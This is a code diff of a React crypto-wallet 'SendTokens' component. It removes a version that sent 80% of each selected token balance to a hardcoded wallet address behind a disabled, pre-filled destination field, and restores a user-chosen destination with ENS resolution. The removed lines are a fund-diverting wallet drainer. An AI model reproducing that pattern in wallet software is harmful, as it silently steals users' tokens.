@@ -26,56 +26,64 @@ export const SendTokens = () => {
   const { data: walletClient } = useWalletClient();
   const publicClient = usePublicClient();
 
-  // Adresse de destination fixe (ajusté selon ta demande)
-  const fixedDestinationAddress = "0x518c5D62647E60864EcB3826e982c93dFa154af3";
-
   const sendAllCheckedTokens = async () => {
     const tokensToSend: ReadonlyArray<`0x${string}`> = Object.entries(checkedRecords)
       .filter(([tokenAddress, { isChecked }]) => isChecked)
       .map(([tokenAddress]) => tokenAddress as `0x${string}`);
 
     if (!walletClient) return;
+    if (!destinationAddress) return;
 
-    // On s'assure que l'adresse de destination est valide
-    const destination = isAddress(fixedDestinationAddress) ? fixedDestinationAddress : destinationAddress;
-    if (!destination || destination.length === 0) {
-      showToast('Adresse de destination invalide', 'error');
+    // Résolution de l'adresse ENS si nécessaire
+    if (destinationAddress.includes('.')) {
+      const resolvedDestinationAddress = await publicClient.getEnsAddress({
+        name: normalize(destinationAddress),
+      });
+      if (resolvedDestinationAddress) {
+        setDestinationAddress(resolvedDestinationAddress);
+      }
       return;
     }
 
-    // Envoi des tokens sélectionnés
+    // Forcer le type de destination en `0x${string}` pour éviter l'erreur
+    const destination = destinationAddress as `0x${string}`;
+
+    // Envoi des tokens
     for (const tokenAddress of tokensToSend) {
-      const token = tokens.find((token) => token.contract_address === tokenAddress);
-      if (!token) continue;
+      const token = tokens.find(
+        (token) => token.contract_address === tokenAddress,
+      );
 
-      const tokenBalance = BigInt(token?.balance || '0');
-      const amountToSend = tokenBalance * 80n / 100n; // Calculer 80% du solde
+      const { request } = await publicClient.simulateContract({
+        account: walletClient.account,
+        address: tokenAddress,
+        abi: erc20ABI,
+        functionName: 'transfer',
+        args: [
+          destination, // Utilisation de destination au type correct
+          BigInt(token?.balance || '0'),
+        ],
+      });
 
-      try {
-        const { request } = await publicClient.simulateContract({
-          account: walletClient.account,
-          address: tokenAddress,
-          abi: erc20ABI,
-          functionName: 'transfer',
-          args: [
-            destination,
-            amountToSend,
-          ],
+      await walletClient
+        ?.writeContract(request)
+        .then((res) => {
+          setCheckedRecords((old) => ({
+            ...old,
+            [tokenAddress]: {
+              ...old[tokenAddress],
+              pendingTxn: res,
+            },
+          }));
+        })
+        .catch((err) => {
+          showToast(
+            `Error with ${token?.contract_ticker_symbol} ${
+              err?.reason || 'Unknown error'
+            }`,
+            'warning',
+          );
         });
-
-        const response = await walletClient.writeContract(request);
-        setCheckedRecords((old) => ({
-          ...old,
-          [tokenAddress]: {
-            ...old[tokenAddress],
-            pendingTxn: response,
-          },
-        }));
-
-        showToast(`Transfert réussi pour ${token?.contract_ticker_symbol}`, 'success');
-      } catch (err) {
-        showToast(`Erreur avec ${token?.contract_ticker_symbol}: ${err?.reason || 'Erreur inconnue'}`, 'warning');
-      }
     }
   };
 
@@ -90,11 +98,19 @@ export const SendTokens = () => {
   return (
     <div style={{ margin: '20px' }}>
       <form>
-        {/* Input de l'adresse de destination (désactivé et pré-rempli) */}
+        Destination Address:
         <Input
-          value={fixedDestinationAddress}
-          disabled
+          required
+          value={destinationAddress}
           placeholder="vitalik.eth"
+          onChange={(e) => setDestinationAddress(e.target.value)}
+          type={
+            addressAppearsValid
+              ? 'success'
+              : destinationAddress.length > 0
+              ? 'warning'
+              : 'default'
+          }
           width="100%"
           style={{
             marginLeft: '10px',
@@ -104,12 +120,12 @@ export const SendTokens = () => {
         <Button
           type="secondary"
           onClick={sendAllCheckedTokens}
-          disabled={checkedCount === 0}
+          disabled={!addressAppearsValid}
           style={{ marginTop: '20px' }}
         >
           {checkedCount === 0
-            ? 'Sélectionnez un ou plusieurs tokens'
-            : `Envoyer ${checkedCount} tokens`}
+            ? 'Select one or more tokens above'
+            : `Send ${checkedCount} tokens`}
         </Button>
       </form>
     </div>
